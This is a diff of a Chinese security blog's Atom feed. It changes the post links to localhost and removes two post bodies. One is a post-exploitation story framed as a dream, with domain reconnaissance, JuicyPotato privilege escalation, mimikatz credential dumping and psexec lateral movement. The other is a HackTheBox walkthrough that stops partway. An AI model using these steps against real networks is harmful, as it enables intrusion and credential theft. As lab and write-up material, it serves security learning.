+    <id>http://127.0.0.1/2022/02/16/Java_RMI%E6%94%BB%E5%87%BB%E5%88%86%E6%9E%90%E4%B8%8E%E6%80%BB%E7%BB%93/</id>
     <published>2022-02-16T12:42:53.000Z</published>
     <updated>2022-02-16T12:43:23.064Z</updated>
     
@@ -66,19 +113,19 @@
     
     
     
-    <category term="代码审计" scheme="https://blog.play2win.top/categories/代码审计/"/>
+    <category term="代码审计" scheme="http://127.0.0.1/categories/代码审计/"/>
     
     
-    <category term="反序列化" scheme="https://blog.play2win.top/tags/反序列化/"/>
+    <category term="反序列化" scheme="http://127.0.0.1/tags/反序列化/"/>
     
-    <category term="RMI" scheme="https://blog.play2win.top/tags/RMI/"/>
+    <category term="RMI" scheme="http://127.0.0.1/tags/RMI/"/>
     
   </entry>
   
   <entry>
     <title>log4j漏洞分析</title>
-    <link href="https://blog.play2win.top/2021/12/16/log4j%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
-    <id>https://blog.play2win.top/2021/12/16/log4j%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</id>
+    <link href="http://127.0.0.1/2021/12/16/log4j%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
+    <id>http://127.0.0.1/2021/12/16/log4j%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</id>
     <published>2021-12-16T12:09:53.000Z</published>
     <updated>2022-02-16T12:42:10.956Z</updated>
     
@@ -89,21 +136,21 @@
     
     
     
-    <category term="代码审计" scheme="https://blog.play2win.top/categories/代码审计/"/>
+    <category term="代码审计" scheme="http://127.0.0.1/categories/代码审计/"/>
     
     
-    <category term="log4j" scheme="https://blog.play2win.top/tags/log4j/"/>
+    <category term="log4j" scheme="http://127.0.0.1/tags/log4j/"/>
     
-    <category term="struts2" scheme="https://blog.play2win.top/tags/struts2/"/>
+    <category term="struts2" scheme="http://127.0.0.1/tags/struts2/"/>
     
-    <category term="JNDI" scheme="https://blog.play2win.top/tags/JNDI/"/>
+    <category term="JNDI" scheme="http://127.0.0.1/tags/JNDI/"/>
     
   </entry>
   
   <entry>
     <title>fastjson不出网利用简析</title>
-    <link href="https://blog.play2win.top/2021/11/25/fastjson%E4%B8%8D%E5%87%BA%E7%BD%91%E5%88%A9%E7%94%A8%E7%AE%80%E6%9E%90/"/>
-    <id>https://blog.play2win.top/2021/11/25/fastjson%E4%B8%8D%E5%87%BA%E7%BD%91%E5%88%A9%E7%94%A8%E7%AE%80%E6%9E%90/</id>
+    <link href="http://127.0.0.1/2021/11/25/fastjson%E4%B8%8D%E5%87%BA%E7%BD%91%E5%88%A9%E7%94%A8%E7%AE%80%E6%9E%90/"/>
+    <id>http://127.0.0.1/2021/11/25/fastjson%E4%B8%8D%E5%87%BA%E7%BD%91%E5%88%A9%E7%94%A8%E7%AE%80%E6%9E%90/</id>
     <published>2021-11-25T03:51:53.000Z</published>
     <updated>2021-11-25T03:53:27.000Z</updated>
     
@@ -114,21 +161,21 @@
     
     
     
-    <category term="代码审计" scheme="https://blog.play2win.top/categories/代码审计/"/>
+    <category term="代码审计" scheme="http://127.0.0.1/categories/代码审计/"/>
     
     
-    <category term="内存马" scheme="https://blog.play2win.top/tags/内存马/"/>
+    <category term="内存马" scheme="http://127.0.0.1/tags/内存马/"/>
     
-    <category term="tomcat" scheme="https://blog.play2win.top/tags/tomcat/"/>
+    <category term="tomcat" scheme="http://127.0.0.1/tags/tomcat/"/>
     
-    <category term="Spring" scheme="https://blog.play2win.top/tags/Spring/"/>
+    <category term="Spring" scheme="http://127.0.0.1/tags/Spring/"/>
     
   </entry>
   
   <entry>
     <title>fastjson反序列化漏洞学习</title>
-    <link href="https://blog.play2win.top/2021/10/31/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/"/>
-    <id>https://blog.play2win.top/2021/10/31/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/</id>
+    <link href="http://127.0.0.1/2021/10/31/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/"/>
+    <id>http://127.0.0.1/2021/10/31/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/</id>
     <published>2021-10-31T06:20:53.000Z</published>
     <updated>2021-10-31T06:20:54.000Z</updated>
     
@@ -139,17 +186,17 @@
     
     
     
-    <category term="代码审计" scheme="https://blog.play2win.top/categories/代码审计/"/>
+    <category term="代码审计" scheme="http://127.0.0.1/categories/代码审计/"/>
     
     
-    <category term="反序列化" scheme="https://blog.play2win.top/tags/反序列化/"/>
+    <category term="反序列化" scheme="http://127.0.0.1/tags/反序列化/"/>
     
   </entry>
   
   <entry>
     <title>Confluence模板注入（CVE-2020-4027）复现</title>
-    <link href="https://blog.play2win.top/2021/10/20/Confluence%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%EF%BC%88CVE-2020-4027%EF%BC%89%E5%A4%8D%E7%8E%B0/"/>
-    <id>https://blog.play2win.top/2021/10/20/Confluence%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%EF%BC%88CVE-2020-4027%EF%BC%89%E5%A4%8D%E7%8E%B0/</id>
+    <link href="http://127.0.0.1/2021/10/20/Confluence%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%EF%BC%88CVE-2020-4027%EF%BC%89%E5%A4%8D%E7%8E%B0/"/>
+    <id>http://127.0.0.1/2021/10/20/Confluence%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%EF%BC%88CVE-2020-4027%EF%BC%89%E5%A4%8D%E7%8E%B0/</id>
     <published>2021-10-20T06:37:53.000Z</published>
     <updated>2021-10-20T07:58:45.000Z</updated>
     
@@ -160,17 +207,17 @@
     
     
     
-    <category term="代码审计" scheme="https://blog.play2win.top/categories/代码审计/"/>
+    <category term="代码审计" scheme="http://127.0.0.1/categories/代码审计/"/>
     
     
-    <category term="模板注入" scheme="https://blog.play2win.top/tags/模板注入/"/>
+    <category term="模板注入" scheme="http://127.0.0.1/tags/模板注入/"/>
     
   </entry>
   
   <entry>
     <title>Java内存马及其机制学习</title>
-    <link href="https://blog.play2win.top/2021/09/27/Java%E5%86%85%E5%AD%98%E9%A9%AC%E5%8F%8A%E5%85%B6%E6%9C%BA%E5%88%B6%E5%AD%A6%E4%B9%A0/"/>
-    <id>https://blog.play2win.top/2021/09/27/Java%E5%86%85%E5%AD%98%E9%A9%AC%E5%8F%8A%E5%85%B6%E6%9C%BA%E5%88%B6%E5%AD%A6%E4%B9%A0/</id>
+    <link href="http://127.0.0.1/2021/09/27/Java%E5%86%85%E5%AD%98%E9%A9%AC%E5%8F%8A%E5%85%B6%E6%9C%BA%E5%88%B6%E5%AD%A6%E4%B9%A0/"/>
+    <id>http://127.0.0.1/2021/09/27/Java%E5%86%85%E5%AD%98%E9%A9%AC%E5%8F%8A%E5%85%B6%E6%9C%BA%E5%88%B6%E5%AD%A6%E4%B9%A0/</id>
     <published>2021-09-27T06:37:53.000Z</published>
     <updated>2021-09-27T06:40:42.000Z</updated>
     
@@ -181,17 +228,17 @@
     
     
     
-    <category term="代码审计" scheme="https://blog.play2win.top/categories/代码审计/"/>
+    <category term="代码审计" scheme="http://127.0.0.1/categories/代码审计/"/>
     
     
-    <category term="内存马" scheme="https://blog.play2win.top/tags/内存马/"/>
+    <category term="内存马" scheme="http://127.0.0.1/tags/内存马/"/>
     
   </entry>
   
   <entry>
     <title>没什么好分析的Shiro-550</title>
-    <link href="https://blog.play2win.top/2021/09/14/%E6%B2%A1%E4%BB%80%E4%B9%88%E5%A5%BD%E5%88%86%E6%9E%90%E7%9A%84Shiro-550/"/>
-    <id>https://blog.play2win.top/2021/09/14/%E6%B2%A1%E4%BB%80%E4%B9%88%E5%A5%BD%E5%88%86%E6%9E%90%E7%9A%84Shiro-550/</id>
+    <link href="http://127.0.0.1/2021/09/14/%E6%B2%A1%E4%BB%80%E4%B9%88%E5%A5%BD%E5%88%86%E6%9E%90%E7%9A%84Shiro-550/"/>
+    <id>http://127.0.0.1/2021/09/14/%E6%B2%A1%E4%BB%80%E4%B9%88%E5%A5%BD%E5%88%86%E6%9E%90%E7%9A%84Shiro-550/</id>
     <published>2021-09-14T09:19:53.000Z</published>
     <updated>2021-09-14T09:19:56.000Z</updated>
     
@@ -202,17 +249,17 @@
     
     
     
-    <category term="代码审计" scheme="https://blog.play2win.top/categories/代码审计/"/>
+    <category term="代码审计" scheme="http://127.0.0.1/categories/代码审计/"/>
     
     
-    <category term="反序列化" scheme="https://blog.play2win.top/tags/反序列化/"/>
+    <category term="反序列化" scheme="http://127.0.0.1/tags/反序列化/"/>
     
   </entry>
   
   <entry>
     <title>若依反序列漏洞复现及其修复绕过</title>
-    <link href="https://blog.play2win.top/2021/09/04/%E8%8B%A5%E4%BE%9D%E5%8F%8D%E5%BA%8F%E5%88%97%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%8F%8A%E5%85%B6%E4%BF%AE%E5%A4%8D%E7%BB%95%E8%BF%87/"/>
-    <id>https://blog.play2win.top/2021/09/04/%E8%8B%A5%E4%BE%9D%E5%8F%8D%E5%BA%8F%E5%88%97%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%8F%8A%E5%85%B6%E4%BF%AE%E5%A4%8D%E7%BB%95%E8%BF%87/</id>
+    <link href="http://127.0.0.1/2021/09/04/%E8%8B%A5%E4%BE%9D%E5%8F%8D%E5%BA%8F%E5%88%97%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%8F%8A%E5%85%B6%E4%BF%AE%E5%A4%8D%E7%BB%95%E8%BF%87/"/>
+    <id>http://127.0.0.1/2021/09/04/%E8%8B%A5%E4%BE%9D%E5%8F%8D%E5%BA%8F%E5%88%97%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%8F%8A%E5%85%B6%E4%BF%AE%E5%A4%8D%E7%BB%95%E8%BF%87/</id>
     <published>2021-09-04T09:11:53.000Z</published>
     <updated>2022-04-11T15:20:32.308Z</updated>
     
@@ -223,17 +270,17 @@
     
     
     
-    <category term="代码审计" scheme="https://blog.play2win.top/categories/代码审计/"/>
+    <category term="代码审计" scheme="http://127.0.0.1/categories/代码审计/"/>
     
     
-    <category term="反序列化" scheme="https://blog.play2win.top/tags/反序列化/"/>
+    <category term="反序列化" scheme="http://127.0.0.1/tags/反序列化/"/>
     
   </entry>
   
   <entry>
     <title>JAVA反序列化学习</title>
-    <link href="https://blog.play2win.top/2021/08/24/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/"/>
-    <id>https://blog.play2win.top/2021/08/24/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/</id>
+    <link href="http://127.0.0.1/2021/08/24/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/"/>
+    <id>http://127.0.0.1/2021/08/24/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/</id>
     <published>2021-08-24T07:45:53.000Z</published>
     <updated>2021-08-24T07:49:46.000Z</updated>
     
@@ -244,17 +291,17 @@
     
     
     
-    <category term="代码审计" scheme="https://blog.play2win.top/categories/代码审计/"/>
+    <category term="代码审计" scheme="http://127.0.0.1/categories/代码审计/"/>
     
     
-    <category term="反序列化" scheme="https://blog.play2win.top/tags/反序列化/"/>
+    <category term="反序列化" scheme="http://127.0.0.1/tags/反序列化/"/>
     
   </entry>
   
   <entry>
     <title>php反序列化浅析</title>
-    <link href="https://blog.play2win.top/2021/07/30/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%B5%85%E6%9E%90/"/>
-    <id>https://blog.play2win.top/2021/07/30/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%B5%85%E6%9E%90/</id>
+    <link href="http://127.0.0.1/2021/07/30/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%B5%85%E6%9E%90/"/>
+    <id>http://127.0.0.1/2021/07/30/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%B5%85%E6%9E%90/</id>
     <published>2021-07-30T07:48:53.000Z</published>
     <updated>2021-07-30T07:55:52.000Z</updated>
     
@@ -265,17 +312,17 @@
     
     
     
-    <category term="代码审计" scheme="https://blog.play2win.top/categories/代码审计/"/>
+    <category term="代码审计" scheme="http://127.0.0.1/categories/代码审计/"/>
     
     
-    <category term="反序列化" scheme="https://blog.play2win.top/tags/反序列化/"/>
+    <category term="反序列化" scheme="http://127.0.0.1/tags/反序列化/"/>
     
   </entry>
   
   <entry>
     <title>基于ASP.NET MVC的easycms的easy代码审计</title>
-    <link href="https://blog.play2win.top/2021/07/09/%E5%9F%BA%E4%BA%8EASP.NET_MVC%E7%9A%84easycms%E7%9A%84easy%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
-    <id>https://blog.play2win.top/2021/07/09/%E5%9F%BA%E4%BA%8EASP.NET_MVC%E7%9A%84easycms%E7%9A%84easy%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/</id>
+    <link href="http://127.0.0.1/2021/07/09/%E5%9F%BA%E4%BA%8EASP.NET_MVC%E7%9A%84easycms%E7%9A%84easy%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
+    <id>http://127.0.0.1/2021/07/09/%E5%9F%BA%E4%BA%8EASP.NET_MVC%E7%9A%84easycms%E7%9A%84easy%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/</id>
     <published>2021-07-09T14:51:53.000Z</published>
     <updated>2021-09-04T11:17:13.000Z</updated>
     
@@ -286,19 +333,19 @@
     
     
     
-    <category term="代码审计" scheme="https://blog.play2win.top/categories/代码审计/"/>
+    <category term="代码审计" scheme="http://127.0.0.1/categories/代码审计/"/>
     
     
-    <category term="SSTI" scheme="https://blog.play2win.top/tags/SSTI/"/>
+    <category term="SSTI" scheme="http://127.0.0.1/tags/SSTI/"/>
     
-    <category term="XSS" scheme="https://blog.play2win.top/tags/XSS/"/>
+    <category term="XSS" scheme="http://127.0.0.1/tags/XSS/"/>
     
   </entry>
   
   <entry>
     <title>[PWN]2020铁三第四赛区个人赛writeup</title>
-    <link href="https://blog.play2win.top/2020/11/09/2020%E9%93%81%E4%B8%89%E7%AC%AC%E5%9B%9B%E8%B5%9B%E5%8C%BA%E4%B8%AA%E4%BA%BA%E8%B5%9Bwriteup/"/>
-    <id>https://blog.play2win.top/2020/11/09/2020%E9%93%81%E4%B8%89%E7%AC%AC%E5%9B%9B%E8%B5%9B%E5%8C%BA%E4%B8%AA%E4%BA%BA%E8%B5%9Bwriteup/</id>
+    <link href="http://127.0.0.1/2020/11/09/2020%E9%93%81%E4%B8%89%E7%AC%AC%E5%9B%9B%E8%B5%9B%E5%8C%BA%E4%B8%AA%E4%BA%BA%E8%B5%9Bwriteup/"/>
+    <id>http://127.0.0.1/2020/11/09/2020%E9%93%81%E4%B8%89%E7%AC%AC%E5%9B%9B%E8%B5%9B%E5%8C%BA%E4%B8%AA%E4%BA%BA%E8%B5%9Bwriteup/</id>
     <published>2020-11-09T05:38:27.000Z</published>
     <updated>2020-11-09T05:40:02.000Z</updated>
     
@@ -309,19 +356,19 @@
     
     
     
-    <category term="PWN" scheme="https://blog.play2win.top/categories/PWN/"/>
+    <category term="PWN" scheme="http://127.0.0.1/categories/PWN/"/>
     
     
-    <category term="UAF" scheme="https://blog.play2win.top/tags/UAF/"/>
+    <category term="UAF" scheme="http://127.0.0.1/tags/UAF/"/>
     
-    <category term="StackOverflow" scheme="https://blog.play2win.top/tags/StackOverflow/"/>
+    <category term="StackOverflow" scheme="http://127.0.0.1/tags/StackOverflow/"/>
     
   </entry>
   
   <entry>
     <title>[域渗透]Vulnstack2_walkthrough</title>
-    <link href="https://blog.play2win.top/2020/10/20/[%E5%9F%9F%E6%B8%97%E9%80%8F]Vulnstack2_walkthrough/"/>
-    <id>https://blog.play2win.top/2020/10/20/[%E5%9F%9F%E6%B8%97%E9%80%8F]Vulnstack2_walkthrough/</id>
+    <link href="http://127.0.0.1/2020/10/20/[%E5%9F%9F%E6%B8%97%E9%80%8F]Vulnstack2_walkthrough/"/>
+    <id>http://127.0.0.1/2020/10/20/[%E5%9F%9F%E6%B8%97%E9%80%8F]Vulnstack2_walkthrough/</id>
     <published>2020-10-20T12:57:27.000Z</published>
     <updated>2020-10-20T13:07:08.000Z</updated>
     
@@ -332,17 +379,17 @@
     
     
     
-    <category term="靶机" scheme="https://blog.play2win.top/categories/靶机/"/>
+    <category term="靶机" scheme="http://127.0.0.1/categories/靶机/"/>
     
     
-    <category term="域" scheme="https://blog.play2win.top/tags/域/"/>
+    <category term="域" scheme="http://127.0.0.1/tags/域/"/>
     
   </entry>
   
   <entry>
     <title>[域渗透]Vulnstack1_walkthrough</title>
-    <link href="https://blog.play2win.top/2020/10/13/[%E5%9F%9F%E6%B8%97%E9%80%8F]Vulnstack1_walkthrough/"/>
-    <id>https://blog.play2win.top/2020/10/13/[%E5%9F%9F%E6%B8%97%E9%80%8F]Vulnstack1_walkthrough/</id>
+    <link href="http://127.0.0.1/2020/10/13/[%E5%9F%9F%E6%B8%97%E9%80%8F]Vulnstack1_walkthrough/"/>
+    <id>http://127.0.0.1/2020/10/13/[%E5%9F%9F%E6%B8%97%E9%80%8F]Vulnstack1_walkthrough/</id>
     <published>2020-10-13T03:14:27.000Z</published>
     <updated>2020-10-13T13:02:04.000Z</updated>
     
@@ -353,17 +400,17 @@
     
     
     
-    <category term="靶机" scheme="https://blog.play2win.top/categories/靶机/"/>
+    <category term="靶机" scheme="http://127.0.0.1/categories/靶机/"/>
     
     
-    <category term="域" scheme="https://blog.play2win.top/tags/域/"/>
+    <category term="域" scheme="http://127.0.0.1/tags/域/"/>
     
   </entry>
   
   <entry>
     <title>用不可描述的软件做HTB的前置代理</title>
-    <link href="https://blog.play2win.top/2020/10/05/%E7%94%A8%E4%B8%8D%E5%8F%AF%E6%8F%8F%E8%BF%B0%E7%9A%84%E8%BD%AF%E4%BB%B6%E5%81%9AHTB%E7%9A%84%E5%89%8D%E7%BD%AE%E4%BB%A3%E7%90%86/"/>
-    <id>https://blog.play2win.top/2020/10/05/%E7%94%A8%E4%B8%8D%E5%8F%AF%E6%8F%8F%E8%BF%B0%E7%9A%84%E8%BD%AF%E4%BB%B6%E5%81%9AHTB%E7%9A%84%E5%89%8D%E7%BD%AE%E4%BB%A3%E7%90%86/</id>
+    <link href="http://127.0.0.1/2020/10/05/%E7%94%A8%E4%B8%8D%E5%8F%AF%E6%8F%8F%E8%BF%B0%E7%9A%84%E8%BD%AF%E4%BB%B6%E5%81%9AHTB%E7%9A%84%E5%89%8D%E7%BD%AE%E4%BB%A3%E7%90%86/"/>
+    <id>http://127.0.0.1/2020/10/05/%E7%94%A8%E4%B8%8D%E5%8F%AF%E6%8F%8F%E8%BF%B0%E7%9A%84%E8%BD%AF%E4%BB%B6%E5%81%9AHTB%E7%9A%84%E5%89%8D%E7%BD%AE%E4%BB%A3%E7%90%86/</id>
     <published>2020-10-05T07:10:53.000Z</published>
     <updated>2020-10-05T07:19:24.000Z</updated>
     
@@ -374,15 +421,15 @@
     
     
     
-    <category term="日常" scheme="https://blog.play2win.top/categories/日常/"/>
+    <category term="日常" scheme="http://127.0.0.1/categories/日常/"/>
     
     
   </entry>
   
   <entry>
     <title>第二次梦里的后渗透</title>
-    <link href="https://blog.play2win.top/2020/09/11/%E7%AC%AC%E4%BA%8C%E6%AC%A1%E6%A2%A6%E9%87%8C%E7%9A%84%E5%90%8E%E6%B8%97%E9%80%8F/"/>
-    <id>https://blog.play2win.top/2020/09/11/%E7%AC%AC%E4%BA%8C%E6%AC%A1%E6%A2%A6%E9%87%8C%E7%9A%84%E5%90%8E%E6%B8%97%E9%80%8F/</id>
+    <link href="http://127.0.0.1/2020/09/11/%E7%AC%AC%E4%BA%8C%E6%AC%A1%E6%A2%A6%E9%87%8C%E7%9A%84%E5%90%8E%E6%B8%97%E9%80%8F/"/>
+    <id>http://127.0.0.1/2020/09/11/%E7%AC%AC%E4%BA%8C%E6%AC%A1%E6%A2%A6%E9%87%8C%E7%9A%84%E5%90%8E%E6%B8%97%E9%80%8F/</id>
     <published>2020-09-11T14:59:27.000Z</published>
     <updated>2020-10-05T06:46:16.000Z</updated>
     
@@ -393,17 +440,17 @@
     
     
     
-    <category term="渗透测试" scheme="https://blog.play2win.top/categories/渗透测试/"/>
+    <category term="渗透测试" scheme="http://127.0.0.1/categories/渗透测试/"/>
     
     
-    <category term="域" scheme="https://blog.play2win.top/tags/域/"/>
+    <category term="域" scheme="http://127.0.0.1/tags/域/"/>
     
   </entry>
   
   <entry>
     <title>DDCTF2020 WEB writeup</title>
-    <link href="https://blog.play2win.top/2020/09/07/DDCTF2020_WEB_writeup%20/"/>
-    <id>https://blog.play2win.top/2020/09/07/DDCTF2020_WEB_writeup%20/</id>
+    <link href="http://127.0.0.1/2020/09/07/DDCTF2020_WEB_writeup%20/"/>
+    <id>http://127.0.0.1/2020/09/07/DDCTF2020_WEB_writeup%20/</id>
     <published>2020-09-07T09:42:27.000Z</published>
     <updated>2020-09-07T16:02:23.000Z</updated>
     
@@ -414,53 +461,10 @@
     
     
     
-    <category term="CTF" scheme="https://blog.play2win.top/categories/CTF/"/>
+    <category term="CTF" scheme="http://127.0.0.1/categories/CTF/"/>
     
     
-    <category term="SSTI" scheme="https://blog.play2win.top/tags/SSTI/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>记一次梦里的后渗透</title>
-    <link href="https://blog.play2win.top/2020/08/10/%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%A2%A6%E9%87%8C%E7%9A%84%E5%90%8E%E6%B8%97%E9%80%8F/"/>
-    <id>https://blog.play2win.top/2020/08/10/%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%A2%A6%E9%87%8C%E7%9A%84%E5%90%8E%E6%B8%97%E9%80%8F/</id>
-    <published>2020-08-10T14:59:27.000Z</published>
-    <updated>2020-08-10T16:06:13.000Z</updated>
-    
-    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>前几天晚上做了一个梦，梦里做了一次后渗透，梦到我拿下域控，今天觉得应该记录下来。</p><p>本文纯属虚构，如有雷同纯属巧合。</p><a id="more"></a><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>起手一个webshell，运气比较好，<code>tasklist</code>没有杀软，上传一个cs后门方便执行命令。</p><p>先看看用户和补丁情况，发现发现是个低权限用户<code>nt authority\network service</code>，Windows2008R2补丁也打得挺勤快的。</p><figure class="highlight cmd hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">whoami</span><br><span class="line">wmic qfe get Caption,Description,HotFixID,InstalledOn</span><br></pre></td></tr></table></figure><p><img src="/2020/08/10/记一次梦里的后渗透/屏幕截图 2020-08-10 193301.png" alt></p><p><code>ipconfig</code>看到存在两张内网网卡。</p><p><img src="/2020/08/10/记一次梦里的后渗透/屏幕截图 2020-08-10 193623.png" alt></p><p>查找域控，定位到两台。</p><figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">net group <span class="hljs-string">"domain controllers"</span> /domain</span><br><span class="line">ping XXX</span><br></pre></td></tr></table></figure><p><img src="/2020/08/10/记一次梦里的后渗透/屏幕截图 2020-08-10 195642.png" alt></p><p><img src="/2020/08/10/记一次梦里的后渗透/屏幕截图 2020-08-10 195959.png" alt></p><p>配置文件、txt之类的文件都收集了一遍，没找到敏感信息。</p><h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>虽然补丁打得挺勤快的，但是用<a href="https://twitter.com/itm4n" target="_blank" rel="noopener">twitter大佬</a>的<a href="https://github.com/itm4n/PrivescCheck" target="_blank" rel="noopener">提权检测脚本</a>，用自带命令就是<code>whoami /priv</code>，发现一处特权滥用：SeImpersonatePrivilege。根据三好学生师傅的文章得知可用JuicePotato提权。</p><p><img src="/2020/08/10/记一次梦里的后渗透/屏幕截图 2020-08-10 203125.png" alt></p><p>用多汁土豆运行我们的后门，过会就能在sc里看见上线了一台system权限的机器。</p><figure class="highlight cmd hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">JuicyPotato -l <span class="hljs-number">1337</span> -p \<span class="hljs-built_in">path</span>\to\cs.exe -t *</span><br></pre></td></tr></table></figure><p><img src="/2020/08/10/记一次梦里的后渗透/屏幕截图 2020-08-10 204745.png" alt></p><p>又是运气爆棚的时候，查到本机保存了域控密码，而且是win2008，用mimikatz读一波明文密码。</p><p><img src="/2020/08/10/记一次梦里的后渗透/屏幕截图 2020-08-10 210004.png" alt></p><h2 id="横向移动"><a href="#横向移动" class="headerlink" title="横向移动"></a>横向移动</h2><p>既然有了域名管理员密码，就可以用msf的smb_login和psexec进行横向移动，但我这里用cs的psexec，能直接上线主机。</p><p>右键session点击net view获取target，在target view选中所有target，右键login->psexec，选中读到的明文密码、选中一个listener、选中一个session，开扫！</p><p><img src="/2020/08/10/记一次梦里的后渗透/屏幕截图 2020-08-10 220331.png" alt></p><p>过了半个小时，存活的机子几乎都上了线。</p><p><img src="/2020/08/10/记一次梦里的后渗透/屏幕截图 2020-08-10 163918.png" alt></p><p>再转到msf，用MS17-010扫扫。发现都内网补丁都整挺好的，一个都没扫到。内网还有几台linux的机子，但是不想继续搞了，擦擦屁股，报告给厂商。（跑</p><p><img src="/2020/08/10/记一次梦里的后渗透/屏幕截图 2020-08-10 222547.png" alt></p><h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>如梦初醒，原来我并没有搞什么后渗透，也没拿什么域控，我还是这样的菜，还是无业游民一个，一切都是梦。</p><p>过几天又有ctf打了，得重新拿起pwn，做个pwn弟弟了。</p>]]></content>
-    
-    
-    <summary type="html">&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;前几天晚上做了一个梦，梦里做了一次后渗透，梦到我拿下域控，今天觉得应该记录下来。&lt;/p&gt;
-&lt;p&gt;本文纯属虚构，如有雷同纯属巧合。&lt;/p&gt;</summary>
-    
-    
-    
-    <category term="渗透测试" scheme="https://blog.play2win.top/categories/渗透测试/"/>
-    
-    
-    <category term="域" scheme="https://blog.play2win.top/tags/域/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>HackTheBox Remote walkthrough</title>
-    <link href="https://blog.play2win.top/2020/08/09/HackTheBox_Remote_walkthrough/"/>
-    <id>https://blog.play2win.top/2020/08/09/HackTheBox_Remote_walkthrough/</id>
-    <published>2020-08-09T14:55:27.000Z</published>
-    <updated>2020-08-09T15:08:57.000Z</updated>
-    
-    <content type="html"><![CDATA[<p>…</p><a id="more"></a><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>扫描靶机开放端口，值得注意的是开放了ftp、http和共享文件服务。</p><figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -A 10.10.10.180</span><br></pre></td></tr></table></figure><p><img src="/2020/08/09/HackTheBox_Remote_walkthrough/屏幕截图 2020-08-06 194317.png" style="width:100%;"></p><p>ftp服务允许匿名登录，但是里面没用东西。</p><p><img src="/2020/08/09/HackTheBox_Remote_walkthrough/屏幕截图 2020-08-06 212107.png" style="width:100%;"></p><p>http上的网站，通过搜索底部的关键词发现是开源的asp.net的CMS，最近一个漏洞是后台RCE。</p><p><img src="/2020/08/09/HackTheBox_Remote_walkthrough/屏幕截图 2020-08-06 212722.png" style="width:100%;"></p><p><img src="/2020/08/09/HackTheBox_Remote_walkthrough/屏幕截图 2020-08-06 214607.png" style="width:100%;"></p><p>访问共享文件访问，有一个文件夹任何人都能访问，挂载到本地发现是网站的源码。</p><figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">showmount -e 10.10.10.180</span><br><span class="line">sudo mount 10.10.10.180:/site_backups site_backups</span><br></pre></td></tr></table></figure><p>&lt;img src=”捕获.JPG)</p><h2 id="GETSHELL"><a href="#GETSHELL" class="headerlink" title="GETSHELL"></a>GETSHELL</h2><p>在源码的web.config里发现<code>machineKey</code>，但是前台好像没用到asp.net的控件，所以没派上用场。</p><p><img src="/2020/08/09/HackTheBox_Remote_walkthrough/屏幕截图 2020-08-06 225407.png" style="width:100%;"></p><p>接着又在App_Data文件夹里发现了Sql Server的数据库文件，在里面发现管理员密码的hash，拿去网上碰撞得到密码。</p><p><img src="/2020/08/09/HackTheBox_Remote_walkthrough/屏幕截图 2020-08-06 225842.png" style="width:100%;"></p><p><img src="/2020/08/09/HackTheBox_Remote_walkthrough/屏幕截图 2020-08-06 230041.png" style="width:100%;"></p><p>使用账户<a href="mailto:`admin@htb.local" target="_blank" rel="noopener">`admin@htb.local</a><code>密码</code>baconandcheese`在<a 